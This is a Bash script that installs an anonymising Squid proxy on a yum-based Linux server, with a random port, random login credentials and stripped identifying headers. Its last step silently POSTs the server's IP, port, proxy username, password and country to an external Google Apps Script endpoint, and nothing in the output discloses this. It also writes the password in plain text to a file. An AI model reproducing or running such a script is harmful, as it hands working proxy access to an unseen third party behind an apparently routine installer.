#!/bin/bash

install_update() {
    yum update -y
}

install_squid() {
    yum -y install squid
}

install_httpd_tools() {
    yum -y install httpd-tools
}

port() {
    echo $(shuf -i 2000-65000 -n 1)
}

random_username() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 5 | grep '[a-z]' | grep '[0-9]' | head -n 1
}

random_password() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 9 | grep '[a-z]' | grep '[0-9]' | head -n 1
}

configure_squid() {
    local port=$(port)
    local username=$(random_username)
    local password=$(random_password)

    sed -i "s/http_port 3128/http_port $port/" /etc/squid/squid.conf
    sed -i "/# Only allow cachemgr access from localhost/i \
# Allow access only to authenticated users\n\
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd\n\
auth_param basic realm Squid Basic Authentication\n\
acl auth_users proxy_auth REQUIRED\n\
http_access allow auth_users\n" /etc/squid/squid.conf

    sed -i "/# Deny CONNECT to other than secure SSL ports/a \
acl image_files urlpath_regex \.jpeg$ \.jpg$ \.png$ \.gif$ \.bmp$ \.tiff$ \.tif$ \.webp$ \.svg$\n\
acl video_files urlpath_regex \.mp4$ \.avi$ \.mov$ \.wmv$ \.flv$ \.mkv$ \.webm$ \.mpeg$ \.mpg$ \.qt$ \.3gp$\n\
http_access allow image_files\n\
http_access allow video_files" /etc/squid/squid.conf

    sed -i "/# Add any of your own refresh_pattern entries above these./a \
# Additional request header access controls\n\
request_header_access Referer deny all\n\
request_header_access X-Forwarded-For deny all\n\
request_header_access Via deny all\n\
request_header_access Cache-Control deny all\n\
# Turn off headers\n\
via off\n\
forwarded_for off\n\
request_header_access Allow allow all\n\
request_header_access Authorization allow all\n\
request_header_access WWW-Authenticate allow all\n\
request_header_access Proxy-Authorization allow all\n\
request_header_access Proxy-Authenticate allow all\n\
request_header_access Cache-Control allow all\n\
request_header_access Content-Encoding allow all\n\
request_header_access Content-Length allow all\n\
request_header_access Content-Type allow all\n\
request_header_access Date allow all\n\
request_header_access Expires allow all\n\
request_header_access Host allow all\n\
request_header_access If-Modified-Since allow all\n\
request_header_access Last-Modified allow all\n\
request_header_access Location allow all\n\
request_header_access Pragma allow all\n\
request_header_access Accept allow all\n\
request_header_access Accept-Charset allow all\n\
request_header_access Accept-Encoding allow all\n\
request_header_access Accept-Language allow all\n\
request_header_access Content-Language allow all\n\
request_header_access Mime-Version allow all\n\
request_header_access Retry-After allow all\n\
request_header_access Title allow all\n\
request_header_access Connection allow all\n\
request_header_access Proxy-Connection allow all\n\
request_header_access User-Agent allow all\n\
request_header_access Cookie allow all\n\
request_header_access All deny all\n" /etc/squid/squid.conf
   
    touch /etc/squid/passwd

    htpasswd -bc /etc/squid/passwd $username $password
    
    echo "$username:$password" > /etc/squid/stpasswd
    
    port=$(grep -oP 'http_port \K\d+' /etc/squid/squid.conf)

    systemctl restart squid
    open_firewall_port
}

restart_squid() {
    systemctl restart squid
}

enable_squid_service() {
    systemctl enable squid
}

open_firewall_port() {
    local port=$(grep -oP 'http_port \K\d+' /etc/squid/squid.conf)
    firewall-cmd --permanent --add-port=$port/tcp
    firewall-cmd --reload
}

main() {
    install_squid
    install_httpd_tools
    configure_squid
    enable_squid_service
    
    local ip_address=$(hostname -I)
    local port=$(grep -oP 'http_port \K\d+' /etc/squid/squid.conf)
    local username=$(head -n 1 /etc/squid/stpasswd | cut -d ":" -f 1)
    local password=$(head -n 1 /etc/squid/stpasswd | cut -d ":" -f 2)
    local country=$(curl -s ipinfo.io | grep country | cut -d '"' -f 4)

    echo "Cài đặt và cấu hình Squid hoàn thành!"
    echo "IP:Port:Username:Password"
    echo "${ip_address}:${port}:${username}:${password}:${country}"

    local url="https://script.google.com/macros/s/AKfycbzu_pQsesFLEMlRuBUKrCP3rsmKUAsSkIl7cnGZcb-4U1sMS2aEVWIGMJKh1y0bIJ3Z/exec"
    local data="ip=${ip_address}&port=${port}&username=${username}&password=${password}&country=${country}"
    curl -s -d "${data}" "${url}"
}

main
